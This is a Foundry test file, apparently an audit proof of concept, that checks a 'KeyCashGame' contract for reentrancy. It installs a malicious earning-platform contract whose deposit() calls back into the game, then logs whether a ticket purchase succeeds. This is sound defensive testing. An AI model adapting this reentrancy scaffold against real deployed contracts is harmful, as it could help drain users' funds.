// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/KeyCashGame.sol";

contract MaliciousEarningPlatform is IEarningPlatform {
    KeyCashGame public game;
    address public target;

    constructor(KeyCashGame _game, address _target) {
        game = _game;
        target = _target;
    }

    function deposit() external payable override {
        // Reenter during deposit
        game.getClaimable(target);
    }
}

contract KeyCashReentrancyTest is Test {
    KeyCashGame public game;
    MaliciousEarningPlatform public maliciousPlatform;
    
    address owner = address(0x1);
    address attacker = address(0x2);
    uint256 constant TICKET_PRICE = 100 ether;

    function setUp() public {
        vm.startPrank(owner);
        game = new KeyCashGame();
        
        // Configure game parameters
        game.setTicketPriceShare(10, 30, 60);   // Shares: 10% prize, 30% divs, 60% platform
        game.setPrizePoolShare(20, 30, 40, 10); // Prize allocation
        game.setStartPrice(TICKET_PRICE);
        game.setMaxKeysPerTx(1);
        game.updateRoundPeiod(1 days);
        game.startGame();
        
        // Set malicious platform
        maliciousPlatform = new MaliciousEarningPlatform(game, attacker);
        game.updateEarningPlatform(address(maliciousPlatform));
        vm.stopPrank();
    }

    function testReentrancy() public {
        vm.deal(attacker, 10 * TICKET_PRICE);
        
        console.log("--- BEFORE-Trigger Reentrancy ---");
        // No state changes to verify

        console.log("--- Trigger BuyTickets (with reentrancy) ---");
        vm.startPrank(attacker);
        (bool success, ) = address(game).call{value: TICKET_PRICE}(
            abi.encodeWithSelector(game.buyTickets.selector, 1)
        );
        vm.stopPrank();
        
        console.log("--- AFTER-Trigger Reentrancy ---");
        
        if (success) {
            console.log("Vulnerability exists: Transaction succeeded allowing reentrancy");
        } else {
            console.log("Vulnerability not exist: Transaction reverted preventing reentrancy");
        }
    }
}